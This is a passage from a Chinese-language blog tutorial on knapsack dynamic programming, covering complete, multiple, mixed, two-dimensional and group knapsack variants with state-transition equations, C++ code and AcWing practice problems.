class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>01背包问题是最基本的背包问题，它包含了背包问题中设计状态、方程的最基本思想，另外，别的类型的背包问题往往也可以转换成01背包问题求解。故一定要仔细体会上面基本思路的得出方法，状态转移方程的意义，以及最后怎样优化的空间复杂度。</p><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><ol><li><a href="https://www.acwing.com/problem/content/2/" target="_blank" rel="noopener">acwing模板题——01背包问题</a></li></ol><h1 id="P02-完全背包问题"><a href="#P02-完全背包问题" class="headerlink" title="P02: 完全背包问题"></a>P02: 完全背包问题</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>有N种物品和一个容量为V的背包，每种物品都有无限件可用。第i种物品的费用是c[i]，价值是w[i]。求解将哪些物品装入背包可使这些物品的费用总和不超过背包容量，且价值总和最大。</p><h2 id="基本思路-1"><a href="#基本思路-1" class="headerlink" title="基本思路"></a>基本思路</h2><p>这个问题非常类似于01背包问题，所不同的是每种物品有无限件。也就是从每种物品的角度考虑，与它相关的策略已并非取或不取两种，而是有取0件、取1件、取2件……等很多种。如果仍然按照解01背包时的思路，令$f[i][v]$表示前$i$种物品恰放入一个容量为$v$的背包的最大权值。仍然可以按照每种物品不同的策略写出状态转移方程，像这样：$f[i][v]=max{f[i-1][v-k<em>c[i]]+k</em>w[i]|0&lt;=k<em>c[i]&lt;= v}$。这跟01背包问题一样有$O(N</em>V)$个状态需要求解，但求解每个状态的时间则不是常数了，求解状态$f[i][v]$的时间是$O(v/c[i])$，总的复杂度是超过$O(VN)$的。</p><p>将01背包问题的基本思路加以改进，得到了这样一个清晰的方法。这说明01背包问题的方程的确是很重要，可以推及其它类型的背包问题。但我们还是试图改进这个复杂度。</p><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><h3 id="一个简单有效的优化"><a href="#一个简单有效的优化" class="headerlink" title="一个简单有效的优化"></a>一个简单有效的优化</h3><p>完全背包问题有一个很简单有效的优化，是这样的：若两件物品$i、j$满足$c[i]&lt;=c[j]$且$w[i]&gt;=w[j]$，则将物品$j$去掉，不用考虑。这个优化的正确性显然：任何情况下都可将价值小费用高的$j$换成物美价廉的$i$，得到至少不会更差的方案。对于随机生成的数据，这个方法往往会大大减少物品的件数，从而加快速度。然而这个并不能改善最坏情况的复杂度，因为有可能特别设计的数据可以一件物品也去不掉。</p><h3 id="转化为01背包问题求解"><a href="#转化为01背包问题求解" class="headerlink" title="转化为01背包问题求解"></a>转化为01背包问题求解</h3><p>既然01背包问题是最基本的背包问题，那么我们可以考虑把完全背包问题转化为01背包问题来解。最简单的想法是，考虑到第i种物品最多选$V/c [i]$件，于是可以把第$i$种物品转化为$V/c[i]$件费用及价值均不变的物品，然后求解这个01背包问题。这样完全没有改进基本思路的时间复杂度，但这毕竟给了我们将完全背包问题转化为01背包问题的思路：将一种物品拆成多件物品。</p><p>更高效的转化方法是：把第i种物品拆成费用为$c[i]<em>2^k$、价值为$w[i]</em>2^k$的若干件物品，其中$k$满足$c[i]*2^k&lt;V$。这是二进制的思想，因为不管最优策略选几件第$i$种物品，总可以表示成若干个$2^k$件物品的和。这样把每种物品拆成$O(log(V/c[i]))$件物品，是一个很大的改进。但我们有更优的$O(VN)$的算法。 </p><h3 id="O-VN-的算法"><a href="#O-VN-的算法" class="headerlink" title="$O(VN)$的算法"></a>$O(VN)$的算法</h3><p>这个算法使用一维数组，先看伪代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i=<span class="number">1.</span>.N </span><br><span class="line">    <span class="keyword">for</span> v=<span class="number">0.</span>.V </span><br><span class="line">        f[v]=max&#123;f[v],f[v-c[i]]+w[i]&#125;;</span><br></pre></td></tr></table></figure><p>你会发现，这个伪代码与P01的伪代码只有v的循环次序不同而已。为什么这样一改就可行呢？首先想想为什么P01中要按照$v=V..0$的逆序来循环。这是因为要保证第$i$次循环中的状态$f[i][v]$是由状态$f[i-1][v-c[i]]$递推而来。换句话说，这正是为了保证每件物品只选一次，保证在考虑“选入第$i$件物品”这件策略时，依据的是一个绝无已经选入第$i$件物品的子结果$f[i-1][v-c[i]]$。而现在完全背包的特点恰是每种物品可选无限件，所以在考虑“加选一件第$i$种物品”这种策略时，却正需要一个可能已选入第$i$种物品的子结果$f[i][v-c[i]]$，所以就可以并且必须采用$v= 0..V$的顺序循环。这就是这个简单的程序为何成立的道理。</p><p>这个算法也可以以另外的思路得出。例如，基本思路中的状态转移方程可以等价地变形成这种形式：$f[i][v]=max{f[i-1][v],f[i][v-c[i]]+w[i]}$，将这个方程用一维数组实现，便得到了上面的伪代码。</p><h2 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1e3</span> + <span class="number">5</span>;<span class="comment">//物品最大数量</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxv = <span class="number">1e3</span> + <span class="number">5</span>;<span class="comment">//背包最大体积</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> dp[maxv];<span class="comment">//背包</span></span><br><span class="line"><span class="keyword">int</span> volume[maxn], value[maxn];<span class="comment">//每个物品的体积和价值</span></span><br><span class="line"><span class="keyword">int</span> n, v;<span class="comment">//总物品数、背包体积</span></span><br><span class="line"><span class="comment">//完全背包 每种物品都有无限件可用</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">complete_park</span><span class="params">(<span class="keyword">int</span> val, <span class="keyword">int</span> vol)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = vol; j &lt;= v; j++) &#123;</span><br><span class="line">        dp[j] = max(dp[j], dp[j - vol] + val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt; n&gt;&gt; v;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt; volume[i]&gt;&gt; value[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        complete_park(value[i], volume[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt; dp[v]&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>完全背包问题也是一个相当基础的背包问题，它有两个状态转移方程，分别在“基本思路”以及“O(VN)的算法“的小节中给出。希望你能够对这两个状态转移方程都仔细地体会，不仅记住，也要弄明白它们是怎么得出来的，最好能够自己想一种得到这些方程的方法。事实上，对每一道动态规划题目都思考其方程的意义以及如何得来，是加深对动态规划的理解、提高动态规划功力的好方法。</p><h2 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h2><ol><li><a href="https://www.acwing.com/problem/content/3/" target="_blank" rel="noopener">acwing模板题——完全背包问题</a></li></ol><h1 id="P03-多重背包问题"><a href="#P03-多重背包问题" class="headerlink" title="P03: 多重背包问题"></a>P03: 多重背包问题</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>有N种物品和一个容量为V的背包。第i种物品最多有n[i]件可用，每件费用是c[i]，价值是w[i]。求解将哪些物品装入背包可使这些物品的费用总和不超过背包容量，且价值总和最大。</p><h2 id="基本思路-2"><a href="#基本思路-2" class="headerlink" title="基本思路"></a>基本思路</h2><p>这题目和完全背包问题很类似。基本的方程只需将完全背包问题的方程略微一改即可，因为对于第$i$种物品有$n[i]+1$种策略：取0件，取1件……取 $n[i]$件。令$f[i][v]$表示前$i$种物品恰放入一个容量为$v$的背包的最大权值，则：$f[i][v]=max{f[i-1][v-k<em>c[i]]+ k</em>w[i]|0&lt;=k&lt;=n[i]}$。复杂度是$O(V*∑n[i])$。</p><h2 id="优化-1"><a href="#优化-1" class="headerlink" title="优化"></a>优化</h2><h3 id="转化为01背包问题"><a href="#转化为01背包问题" class="headerlink" title="转化为01背包问题"></a>转化为01背包问题</h3><p>另一种好想好写的基本方法是转化为01背包求解：把第$i$种物品换成$n[i]$件01背包中的物品，则得到了物品数为$∑n[i]$的01背包问题，直接求解，复杂度仍然是$O(V*∑n[i])$。</p><p>但是我们期望将它转化为01背包问题之后能够像完全背包一样降低复杂度。仍然考虑二进制的思想，我们考虑把第$i$种物品换成若干件物品，使得原问题中第i种物品可取的每种策略——取$0..n[i]$件——均能等价于取若干件代换以后的物品。另外，取超过$n[i]$件的策略必不能出现。</p><p>方法是：将第$i$种物品分成若干件物品，其中每件物品有一个系数，这件物品的费用和价值均是原来的费用和价值乘以这个系数。使这些系数分别为 $1,2,4,…,2^{k-1},n[i]-2^k+1$，且$k$是满足$n[i]-2^k+1&gt;0$的最大整数。例如，如果$n[i]$为$13$，就将这种物品分成系数分别为$1,2,4,6$的四件物品。</p><p>分成的这几件物品的系数和为$n[i]$，表明不可能取多于$n[i]$件的第i种物品。另外这种方法也能保证对于$0..n[i]$间的每一个整数，均可以用若干个系数的和表示，这个证明可以分$0..2^{k-1}$和$2^k..n[i]$两段来分别讨论得出，并不难，希望你自己思考尝试一下。</p><p>这样就将第$i$种物品分成了$O(log n[i])$种物品，将原问题转化为了复杂度为$O(V*∑log n[i])$的01背包问题，是很大的改进。</p><h3 id="O-VN-的算法-1"><a href="#O-VN-的算法-1" class="headerlink" title="* $O(VN)$的算法"></a>* $O(VN)$的算法</h3><p>多重背包问题同样有$O(VN)$的算法。这个算法基于基本算法的状态转移方程，但应用单调队列的方法使每个状态的值可以以均摊$O(1)$的时间求解。由于用单调队列优化的DP已超出了NOIP的范围，故本文不再展开讲解。我最初了解到这个方法是在楼天成的“男人八题”幻灯片上。</p><h2 id="代码实现-2"><a href="#代码实现-2" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1e3</span> + <span class="number">5</span>;<span class="comment">//物品最大数量</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxv = <span class="number">1e3</span> + <span class="number">5</span>;<span class="comment">//背包最大体积</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> dp[maxv];<span class="comment">//背包</span></span><br><span class="line"><span class="keyword">int</span> volume[maxn], value[maxn], c[maxn];<span class="comment">//每个物品的体积和价值、数量</span></span><br><span class="line"><span class="keyword">int</span> n, v;<span class="comment">//总物品数、背包体积</span></span><br><span class="line"><span class="comment">//01背包 每种物品仅有一件，可以选择放或不放</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">zero_one_park</span><span class="params">(<span class="keyword">int</span> val, <span class="keyword">int</span> vol)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = v; j &gt;= vol; j--) &#123;</span><br><span class="line">        dp[j] = max(dp[j], dp[j - vol] + val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//完全背包 每种物品都有无限件可用</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">complete_park</span><span class="params">(<span class="keyword">int</span> val, <span class="keyword">int</span> vol)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = vol; j &lt;= v; j++) &#123;</span><br><span class="line">        dp[j] = max(dp[j], dp[j - vol] + val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//多重背包 每种物品都有限件可用</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">multiple_park</span><span class="params">(<span class="keyword">int</span> val, <span class="keyword">int</span> vol, <span class="keyword">int</span> amount)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (vol * amount &gt;= v) &#123;<span class="comment">//该种物品足以装满背包，转化为完全背包</span></span><br><span class="line">        complete_park(val, vol);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="comment">//转化为01背包，将第i种物品分成若干件物品</span></span><br><span class="line">        <span class="keyword">int</span> k = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (k &lt; amount) &#123;</span><br><span class="line">            zero_one_park(k * val, k * vol);</span><br><span class="line">            amount -= k;</span><br><span class="line">            k &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (amount &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            zero_one_park(amount * val, amount * vol);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt; n&gt;&gt; v;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt; volume[i]&gt;&gt; value[i]&gt;&gt; c[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        multiple_park(value[i], volume[i], c[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt; dp[v]&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h2><p>这里我们看到了将一个算法的复杂度由$O(V<em>∑n[i])$改进到$O(V</em>∑log n[i])$的过程，还知道了存在应用超出NOIP范围的知识的O(VN)算法。希望你特别注意“拆分物品”的思想和方法，自己证明一下它的正确性，并用尽量简洁的程序来实现。</p><h2 id="练习-2"><a href="#练习-2" class="headerlink" title="练习"></a>练习</h2><ol><li><a href="https://www.acwing.com/problem/content/4/" target="_blank" rel="noopener">acwing模板题——多重背包问题 I</a></li><li><a href="https://www.acwing.com/problem/content/5/" target="_blank" rel="noopener">acwing模板题——多重背包问题 II</a>：本题考查多重背包的二进制优化方法。</li></ol><h1 id="P04-混合三种背包问题"><a href="#P04-混合三种背包问题" class="headerlink" title="P04: 混合三种背包问题"></a>P04: 混合三种背包问题</h1><h2 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h2><p>如果将P01、P02、P03混合起来。也就是说，有的物品只可以取一次（01背包），有的物品可以取无限次（完全背包），有的物品可以取的次数有一个上限（多重背包）。应该怎么求解呢？</p><h2 id="01背包与完全背包的混合"><a href="#01背包与完全背包的混合" class="headerlink" title="01背包与完全背包的混合"></a>01背包与完全背包的混合</h2><p>考虑到在P01和P02中最后给出的伪代码只有一处不同，故如果只有两类物品：一类物品只能取一次，另一类物品可以取无限次，那么只需在对每个物品应用转移方程时，根据物品的类别选用顺序或逆序的循环即可，复杂度是$O(VN)$。伪代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i=<span class="number">1.</span>.N</span><br><span class="line"><span class="keyword">if</span> 第i件物品是<span class="number">01</span>背包</span><br><span class="line"><span class="keyword">for</span> v=V.<span class="number">.0</span></span><br><span class="line">f[v]=max&#123;f[v],f[v-c[i]]+w[i]&#125;;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> 第i件物品是完全背包</span><br><span class="line"><span class="keyword">for</span> v=<span class="number">0.</span>.V</span><br><span class="line">f[v]=max&#123;f[v],f[v-c[i]]+w[i]&#125;;</span><br></pre></td></tr></table></figure><h2 id="再加上多重背包"><a href="#再加上多重背包" class="headerlink" title="再加上多重背包"></a>再加上多重背包</h2><p>如果再加上有的物品最多可以取有限次，那么原则上也可以给出$O(VN)$的解法：遇到多重背包类型的物品用单调队列解即可。但如果不考虑超过NOIP范围的算法的话，用P03中将每个这类物品分成$O(log n[i])$个01背包的物品的方法也已经很优了。</p><h2 id="小结-3"><a href="#小结-3" class="headerlink" title="小结"></a>小结</h2><p>有人说，困难的题目都是由简单的题目叠加而来的。这句话是否公理暂且存之不论，但它在本讲中已经得到了充分的体现。本来01背包、完全背包、多重背包都不是什么难题，但将它们简单地组合起来以后就得到了这样一道一定能吓倒不少人的题目。但只要基础扎实，领会三种基本背包问题的思想，就可以做到把困难的题目拆分成简单的题目来解决。</p><h2 id="练习-3"><a href="#练习-3" class="headerlink" title="练习"></a>练习</h2><ol><li><a href="acwing.com/problem/content/7/">acwing模板题——混合背包问题</a></li></ol><h1 id="P05-二维费用的背包问题"><a href="#P05-二维费用的背包问题" class="headerlink" title="P05: 二维费用的背包问题"></a>P05: 二维费用的背包问题</h1><h2 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h2><p>二维费用的背包问题是指：对于每件物品，具有两种不同的费用；选择这件物品必须同时付出这两种代价；对于每种代价都有一个可付出的最大值（背包容量）。问怎样选择物品可以得到最大的价值。设这两种代价分别为代价1和代价2，第i件物品所需的两种代价分别为$a[i]$和$b[i]$。两种代价可付出的最大值（两种背包容量）分别为$V$和$U$。物品的价值为$w[i]$。</p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>费用加了一维，只需状态也加一维即可。设$f[i][v][u]$表示前$i$件物品付出两种代价分别为$v$和$u$时可获得的最大价值。状态转移方程就是：$f [i][v][u]=max{f[i-1][v][u],f[i-1][v-a[i]][u-b[i]]+w[i]}$。如前述方法，可以只使用二维的数组：当每件物品只可以取一次时变量$v$和$u$采用逆序的循环，当物品有如完全背包问题时采用顺序的循环。当物品有如多重背包问题时拆分物品。</p><h2 id="物品总个数的限制"><a href="#物品总个数的限制" class="headerlink" title="物品总个数的限制"></a>物品总个数的限制</h2><p>有时，“二维费用”的条件是以这样一种隐含的方式给出的：最多只能取$M$件物品。这事实上相当于每件物品多了一种“件数”的费用，每个物品的件数费用均为$1$，可以付出的最大件数费用为$M$。换句话说，设$f[v][m]$表示付出费用$v$、最多选$m$件时可得到的最大价值，则根据物品的类型（01、完全、多重）用不同的方法循环更新，最后在$f[0..V][0..M]$范围内寻找答案。</p><p>另外，如果要求“恰取M件物品”，则在$f[0..V][M]$范围内寻找答案。</p><h2 id="代码实现-3"><a href="#代码实现-3" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1e3</span> + <span class="number">5</span>;<span class="comment">//物品最大数量</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxv = <span class="number">1e2</span> + <span class="number">5</span>;<span class="comment">//背包最大体积</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxw = <span class="number">1e2</span> + <span class="number">5</span>;<span class="comment">//背包最大承受重量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> dp[maxv][maxw];<span class="comment">//背包</span></span><br><span class="line"><span class="keyword">int</span> volume[maxn], value[maxn], weight[maxn];<span class="comment">//每个物品的体积和价值、重量</span></span><br><span class="line"><span class="keyword">int</span> n, v, w;<span class="comment">//总物品数、背包体积、背包承受重量</span></span><br><span class="line"><span class="comment">//二维01背包</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">two_dimension_park</span><span class="params">(<span class="keyword">int</span> val, <span class="keyword">int</span> wei, <span class="keyword">int</span> vol)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = v; j &gt;= vol; j--) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = w; k &gt;= wei; k--) &#123;</span><br><span class="line">            dp[j][k] = max(dp[j][k], dp[j - vol][k - wei] + val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt; n&gt;&gt; v&gt;&gt; w;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt; volume[i]&gt;&gt; weight[i]&gt;&gt; value[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        two_dimension_park(value[i], weight[i],volume[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt; dp[v][w]&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="小结-4"><a href="#小结-4" class="headerlink" title="小结"></a>小结</h2><p>事实上，当发现由熟悉的动态规划题目变形得来的题目时，在原来的状态中加一维以满足新的限制是一种比较通用的方法。希望你能从本讲中初步体会到这种方法。</p><h2 id="练习-4"><a href="#练习-4" class="headerlink" title="练习"></a>练习</h2><ol><li><a href="https://www.acwing.com/problem/content/8/" target="_blank" rel="noopener">acwing模板题——二维费用的背包问题</a></li></ol><h1 id="P06-分组背包问题"><a href="#P06-分组背包问题" class="headerlink" title="P06: 分组背包问题"></a>P06: 分组背包问题</h1><h2 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h2><p>有$N$件物品和一个容量为$V$的背包。第$i$件物品的费用是$c[i]$，价值是$w[i]$。这些物品被划分为若干组，每组中的物品互相冲突，最多选一件。求解将哪些物品装入背包可使这些物品的费用总和不超过背包容量，且价值总和最大。</p><h2 id="算法-1"><a href="#算法-1" class="headerlink" title="算法"></a>算法</h2><p>这个问题变成了每组物品有若干种策略：是选择本组的某一件，还是一件都不选。也就是说设$f[k][v]$表示前$k$组物品花费费用$v$能取得的最大权值，则有$f[k][v]=max{f[k-1][v],f[k-1][v-c[i]]+w[i]|物品i属于第k组}$。</p><p>使用一维数组的伪代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> 所有的组k</span><br><span class="line">    <span class="keyword">for</span> v=V.<span class="number">.0</span></span><br><span class="line">        <span class="keyword">for</span> 所有的i属于组k</span><br><span class="line">            f[v]=max&#123;f[v],f[v-c[i]]+w[i]&#125;</span><br></pre></td></tr></table></figure><p>注意这里的三层循环的顺序，“for v=V..0”这一层循环必须在“for 所有的i属于组k”之外。这样才能保证每一组内的物品最多只有一个会被添加到背包中。</p><p>另外，显然可以对每组中的物品应用P02中“一个简单有效的优化”。</p><h2 id="代码实现-4"><a href="#代码实现-4" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1e2</span> + <span class="number">5</span>;<span class="comment">//物品最大数量</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxv = <span class="number">1e2</span> + <span class="number">5</span>;<span class="comment">//背包最大体积</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> dp[maxv];<span class="comment">//背包</span></span><br><span class="line"><span class="keyword">int</span> volume[maxn], value[maxn];<span class="comment">//每个物品的体积和价值</span></span><br><span class="line"><span class="keyword">int</span> n, v;<span class="comment">//物品组数、背包体积</span></span><br><span class="line"><span class="comment">//分组背包 物品被划分为若干组，每组最多选一件</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">group_park</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> vol)</span> </span>&#123;<span class="comment">//物品组数、背包最大容量</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">1</span>; k &lt;= n; k++) &#123;</span><br><span class="line">        <span class="keyword">int</span> t;<span class="comment">//每组的个数</span></span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt; t;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= t; i++) &#123;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt; volume[i]&gt;&gt; value[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//从前k组中选</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = vol; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> l = <span class="number">1</span>; l &lt;= t; l++) 